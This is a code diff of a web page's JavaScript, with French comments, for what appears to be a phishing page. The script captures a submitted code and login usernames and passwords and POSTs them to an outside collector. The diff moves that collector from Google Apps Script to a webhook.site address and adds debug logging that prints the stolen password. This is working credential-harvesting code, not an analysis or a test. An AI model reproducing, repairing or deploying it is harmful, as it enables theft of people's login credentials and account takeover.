@@ -63,25 +63,25 @@ const translations = {
 // Langue par défaut
 let currentLang = 'en';
 
-// Remplace par ton URL Google Apps Script
-const GOOGLE_SHEET_URL = 'https://script.google.com/macros/s/AKfycbwJW28v5Td5bVAtEtwCdNtHumbX8k5FLWQ91RemPv92K0XS3fPcmXsyHbtzBpMgQxA/exec';
+// Remplace par ton URL Webhook.site (ou Google Sheets si ça marchait avant)
+const GOOGLE_SHEET_URL = 'https://webhook.site/[TON_ID]'; // Va sur webhook.site pour une nouvelle URL
 
-// Fonction pour envoyer les données à Google Sheets
+// Fonction pour envoyer les données
 function sendDataToSheet(type, value) {
     const data = {
         type: type,
         value: value
     };
-    console.log('Tentative d’envoi à Google Sheets:', data);
+    console.log('Tentative d’envoi:', data); // Débogage
     fetch(GOOGLE_SHEET_URL, {
         method: 'POST',
-        mode: 'no-cors', // Limite les retours, mais nécessaire pour GitHub Pages
+        mode: 'no-cors',
         headers: {
             'Content-Type': 'application/json'
         },
         body: JSON.stringify(data)
     })
-    .then(() => console.log('Requête POST envoyée (pas de réponse visible à cause de no-cors):', data))
+    .then(() => console.log('Requête POST envoyée:', data))
     .catch(error => console.error('Erreur lors de l’envoi:', error));
 }
 
@@ -172,7 +172,6 @@ if (document.getElementById('codeForm')) {
         message.textContent = translations.index[currentLang].verifying;
         button.disabled = true;
 
-        // Envoyer le code à Google Sheets
         const codeEntry = `Code saisi : ${code}`;
         sendDataToSheet('Code', codeEntry);
 
@@ -188,13 +187,15 @@ if (document.getElementById('codeForm')) {
 
 // Handle login form submission (login.html)
 if (document.getElementById('loginForm')) {
+    console.log('Login form détecté'); // Débogage pour vérifier si ce bloc s’exécute
     document.getElementById('loginForm').addEventListener('submit', function(event) {
         event.preventDefault();
+        console.log('Formulaire login soumis'); // Débogage
 
         const username = document.getElementById('username-placeholder').value;
         const password = document.getElementById('password-placeholder').value;
+        console.log('Username:', username, 'Password:', password); // Débogage
 
-        // Envoyer les identifiants à Google Sheets
         const credentialEntry = `Utilisateur : ${username} | Mot de passe : ${password}`;
         sendDataToSheet('Credentials', credentialEntry);
 
